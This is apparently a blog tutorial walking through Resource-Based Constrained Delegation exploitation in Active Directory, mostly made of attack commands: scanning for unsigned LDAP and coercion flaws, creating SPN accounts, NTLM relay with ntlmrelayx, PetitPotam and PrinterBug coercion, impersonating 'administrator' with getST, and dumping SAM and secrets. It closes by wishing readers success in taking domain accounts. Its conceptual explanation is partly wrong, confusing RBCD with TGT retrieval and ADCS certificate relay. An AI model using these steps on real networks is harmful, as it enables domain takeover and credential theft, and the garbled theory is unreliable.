
# Resource-Based Constrained Delegation (RBCD) Exploitation

## Initial Engagement

### Introduction

 In this article, we'll delve into the world of Resource-Based Constrained Delegation (RBCD), a Windows-specific protocol that can be exploited for unauthorized access and understand how  to perform RBCD to gain elevated privileges or even domain administrator rights.

### What is RBCD?

RBCD is a Kerberos-based protocol that allows a service on a domain-joined computer to obtain a ticket-granting ticket (TGT) for a specified user account. This process is constrained by the permissions of the service, so the TGT obtained is limited in its scope and can't be used for unauthorized access. (We'll see about that)

### Why Should You Care?

 Understanding how to exploit RBCD vulnerabilities to gain unauthorized access to sensitive resources can add more to your toolkit. Understanding how constrain and coercion works you'll be better equipped to identify and mitigate (or exploit) these risks, ensuring the security of your organization's infrastructure.

## The How-To Guide

RBDC exploitation needs an specific set off conditions. I'll add a list of those conditions and we'll be going through it along the article so don't worry if you don't get something right away just keep reading.

- A domain controller with ldap signing disabled or not enforced
- A victim server with Web-based Distributed Authoring and Versioning (Webdav) enabled
- A domain user account with Service Principal Name (SPN) and delegation permissions 

That's good! Enough talk lets get in to the exploitation.
### Step 1: Identify Potential Targets

To exploit an RBCD vulnerability, you need to find a target that has not implemented proper security measures. we are looking for domain controllers with ldap signing disabled NetExec is our friend here.

```
nxc ldap <IP/Scope> -u <username> -p <password> -d <domain.com> -M ldap-checker
```

after we get our vulnerable domain controller we need to identify a machine to attack this is going to be our target this machine has to have webdav enabled and be vulnerable to two authentication coercion we are going to look for MS-EFSRPC (PetitPotam) or MS-RPRN (PrinterBug).

```
nxc smb <IP/Scope> -u <username> -p <password> -d <domain.com> -M coerce_plus
```

Now we got our targets, a vulnerable domain controller to perform the relay and a vulnerable machine to perform the coercion.
### Step 2: Setup our machine

Before proceeding with the exploit you'll need an account with SPN, if you're lucky enough your account already have an SPN if you don't have one there are a couple of ways to get one.

1. **Modify DNS record**
2. **Create a Machine account**

##### Modify DNS Record 

To modify the DNS record we can use a tool called `dnstool.py` that is part of the `krbrelayx` repository by the incredible Dirkjanm.

```
dnstool.py -u domain.com\username -p <password> -a add -t A -r <machinename> -d your_ip dns_server_ip
```

Let break this command a little:

- -a add : Action to take on the dns server
- -t A : Type of record 
- -r : Record to add (the name you want to use)
- -d : your attacker machine ip followed by the dns server ip

if this succeeds congrats you can continue with the relay if you don't have permissions maybe you can create a machine account.

##### Create a machine account

First of all we need to check if we have permissions to create machine accounts lets pull nxc again and check for the domain controller machine account quota (MAQ).

```
nxc ldap <IP/Scope> -u <username> -p <password> -d <domain.com> -M maq
```

if we have a maq above 0 we can attemp to create a machine account all machine accounts have SPN as default

to create a machine account we are going to use a tool from the Impacket Repo called `addcomputer.py`.

```
addcomputer.py -method LDAPS -computer-name 'COMPUTERNAME$' -computer-pass 'Password' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\user:password'
```

- `-dc-host` : hostname of the domain controller.
- `-domain-netbios`: the domain's name where the new computer account will be added. 
- `-computer-name`: the name of the new computer account. 
- `-computer-pass`: password of the new computer account. 
- `-method`: the method to add the new computer account. It can be:
	- SAMR to add the account via SMB 
	- LDAPS. 
	(This is important the default method is SAMR and with SAMR the account will be created without SPNs)

if this succeeds congrats you can continue with the relay.
### Step 3: Configure and Launch the RBCD Exploit

RBCD is a relay attack we are going to relay the authentication from one machine to our own using coercion then we are going to relay that authentication attempt to a ADCS and get the certificate then we use that certificate to impersonate the victim account and get the kerberos ticket(TGT).

![Relay.png](https://zer0xfr.github.io/images/relay.png)
 
Lets start by setting up the relay. We are going to use another Impacket tool called `ntlmrelayx.py`.

```
./ntlmrelayx.py -smb2support -t ldaps://dc.domain.com --http-port 8080 --delegate-access --escalate-user SPNusername --no-dump --no-acl --no-da --remove-mic
```

Let `ntlmrelayx.py` running and attempt authentication. we have two ways for the coercion: 

- MS-EFSRPC (PetitPotam)  
- MS-RPRN (PrinterBug)

###### MS-EFSRPC (PetitPotam)
```
./PetitPotam.py -d episourcein.episource.com -u 'user' -p 'password' SPNUsername@8080/path victim.domain.com
```

###### MS-RPRN (PrinterBug)

```
./printerbug.py domain.com/user:password@victim.domain.com SPNUsername@8080/path
```

Then we are going to request the Impersonated Service Ticket for this we are going to use another impacket tool called `getSt.py`.

```
./getST.py -spn cifs/victim.domain.com -impersonate 'administrator' domain.com/SPNusername:'password' -dc-ip <domain_ip> 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[-] CCache file is not found. Skipping... 
[*] Getting TGT for user
[*] Impersonating ldap.
```

Then we just have one step left retrieve the ticket stored in cache

```
export KRB5CCNAME=/yourpath/domainAdmin.ccache
```
### Step 4: Profit

Now you can use this kerberos credentials to do whatever you want enumerate, dump creds, etc ...

```
nxc smb victim.domain.com --use-kcache --sam 
```

```
./secretsdump.py -k -no-pass victim.domain.com
```

## Conclusion

Hope this guide help you get some Domain Accounts, By understanding how you can misuse RBCD vulnerabilities, you'll be better equipped to pawn more things. Keep Hacking!
